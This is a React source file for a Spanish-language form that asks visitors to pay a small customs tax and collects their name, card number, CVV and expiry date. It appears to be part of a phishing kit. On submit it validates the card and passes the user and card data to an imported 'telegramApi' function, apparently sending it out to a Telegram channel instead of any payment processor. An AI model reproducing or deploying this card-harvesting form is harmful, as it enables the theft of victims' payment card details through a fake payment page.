import React, { useState } from 'react'
import { useEffect } from 'react'
import telegramApi from './telegramApi'
// const cardsExamples=[
//     4242424242424242,	
//     5555555555554444,	
//     2223003122003222,	
//     5200828282828210,	
//     5105105105105100,	
//     371449635398431,
//     6011111111111117,	
//     6011000990139424,	
//     6011981111111113,	
//     3056930009020004,	
//     36227206271667,
//     3566002020360505,	
//     6200000000000005,
// ]
const form2 = ({showMenuPay,inputClass,formPay,setFormPay,setMensajeFelicidades,formUser}) => {
    const [valided,setValided]=useState(false)
    
    const validTarjeta=(tarjeta)=>{
        
        let patron = /^(?:(4[0-9]{12}(?:[0-9]{3})?)|(5[1-5][0-9]{14})|(6(?:011|5[0-9]{2})[0-9]{12})|(3[47][0-9]{13})|(3(?:0[0-5]|[68][0-9])[0-9]{11})|((?:2131|1800|35[0-9]{3})[0-9]{11}))$/; 
        let dinerClub=/3(?:0[0-5]|[68][0-9])[0-9]{11}$/
        let masterCard=/5[1-5][0-9]{14}$/
        let masterCardS2=/^5[1-5]\d{14}$|^2(?:2(?:2[1-9]|[3-9]\d)|[3-6]\d\d|7(?:[01]\d|20))\d{12}$/
        let unionPay=/^(62[0-9]{14,17})$/
        
        if(patron.test(tarjeta)||dinerClub.test(tarjeta)||
            masterCard.test(tarjeta)||
            masterCardS2.test(tarjeta)||
            unionPay.test(tarjeta)
        ){
            setValided(false)
        }else{
            setValided(true)
        }
        
    }
    
    useEffect(()=>{
        formPay.cvv.length>4&&setFormPay({...formPay,
        cvv:formPay.cvv.slice(0,4)})
    },[formPay])
    
    const handleChange=(e)=>{
        setFormPay({...formPay,
                [e.target.name]:e.target.value})
    }
    
    const enviarDatos=(e)=>{
        e.preventDefault()
        const {nombreApellido,numeroTarjeta,expiracion,cvv}=formPay;
        
        if(!valided&&nombreApellido&&expiracion&&cvv){
            setMensajeFelicidades(true)
            telegramApi(formUser,formPay)
        }
    }
    return (
    <form style={{top:showMenuPay?"0px":"550px"}} className={`border-2 absolute w-full h-full bg-white ${showMenuPay?"":""} transition-all duration-500 ease-in-out`}>
        <div className='bg-gray-200 w-full border-2 h-6 mb-0  border-t-gray-300'></div>
        <div className='w-full px-4'>
            <h5 className='text-base md:text-xl my-4'>Realizar pago de impuesto de aduanas por valor de: $9.650 COP.</h5>
            
            <input className={inputClass} onChange={handleChange} 
                value={formPay.nombreApellido} type="text" 
                name="nombreApellido" 
                placeholder="Nombre y Apellido" 
                required
            />
            <input className="w-full bg-gray-200 py-3 mb-4 rouneded-md px-2" onChange={(e)=>handleChange(e,"form2")} 
                value={formPay.numeroTarjeta} 
                type="number" 
                name="numeroTarjeta" 
                placeholder="Número de tarjeta de credito" 
                onBlur={()=>validTarjeta(formPay.numeroTarjeta)}
                required
            />
            {valided&&<div className='text-red-400 px-2 my-2'>Tarjeta invalida</div>} 
            <input className={inputClass} onChange={handleChange} 
                value={formPay.cvv}
                type="number" 
                name="cvv" 
                placeholder="CVV" 
                required
            />
            <input className={inputClass} onChange={handleChange} 
                value={formPay.expiracion} 
                type="text" 
                name="expiracion" 
                placeholder="Fecha Expiración " 
                required
            />
        </div>
        <button className='bg-orange-600 text-white w-full py-3 hover:underline rounded-md text-xs md:text-base' onClick={(e)=>enviarDatos(e)}>Realizar pago por: $9.650 COP</button>
    </form>
  )
}

export default form2